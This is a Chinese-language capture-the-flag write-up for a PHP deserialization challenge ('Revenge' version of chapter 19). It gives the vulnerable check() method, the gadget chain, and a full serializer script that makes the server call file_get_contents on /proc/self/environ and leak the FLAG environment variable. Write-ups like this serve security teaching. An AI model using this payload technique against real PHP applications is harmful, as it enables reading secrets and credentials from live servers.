# 19 第十九章 Revenge：星穹真相·补天归源

## 题目简述

Revenge 版本重写了第十九章的类链：`PersonC::check()` 禁止函数名严格等于 `system`，但仍允许调用其他可调用对象。容器没有把 flag 写入文件，也没有清除启动环境，因此可以改用 `file_get_contents('/proc/self/environ')` 读取 PHP 进程环境，在其中取得平台注入的 `FLAG`。

## 解题过程

危险点在 `PersonC::check()`：

```php
public function check($age)
{
    $name = $this->name;

    if ($age == null) {
        die("Age can't be empty.");
    } elseif ($name === "system") {
        die("Hacker!");
    } else {
        var_dump($name($age));
    }
}
```

`$name($age)` 仍然是任意函数调用，只是屏蔽了一个函数名。令 `$name` 为 `file_get_contents`，令 `$age` 为 `/proc/self/environ` 即可。对象链负责把路径搬入 `PersonA::$age`：

```text
PersonC::__wakeup()
  -> PersonB::__invoke(PersonC)
  -> PersonA::$name = PersonC
  -> PersonA::$age = "/proc/self/environ"
PersonA::__destruct()
  -> PersonC->check("/proc/self/environ")
  -> file_get_contents("/proc/self/environ")
```

完整生成脚本如下：

```php
<?php
class PersonA {
    public $name;
    public $id;
    public $age;
}

class PersonB {
    public $name;
    public $id;
    public $age;
}

class PersonC {
    public $name;
    public $id;
    public $age;
}

$reader = new PersonC();
$reader->name = "file_get_contents";

$destructor = new PersonA();
$destructor->name = $reader;
$destructor->id = "check";

$bridge = new PersonB();
$bridge->name = "/proc/self/environ";
$bridge->id = $destructor;

$reader->id = $bridge;

echo urlencode(serialize($reader)), PHP_EOL;
```

把生成结果作为 `person` 参数提交。响应中的 `var_dump()` 会显示一串以 NUL 字节分隔的环境变量，搜索 `FLAG=` 即可提取 flag。

这里读取 `/proc/self/environ` 不是经验猜测：该版本的 Dockerfile 直接用 `php -S` 启动服务，没有像普通版那样将 flag 写入 `/flag` 后执行 `unset FLAG`，所以环境变量仍保留在当前 PHP 进程中。

## 方法总结

黑名单只拦截 `system` 并没有消除任意函数调用。遇到可控的 `$function($argument)` 时，应根据数据所在位置选择读取原语：若敏感信息在环境变量中，`file_get_contents('/proc/self/environ')` 比命令执行更直接。对同一题的 Revenge 版本，还要重新核对容器启动方式，不能沿用普通版的 flag 路径假设。
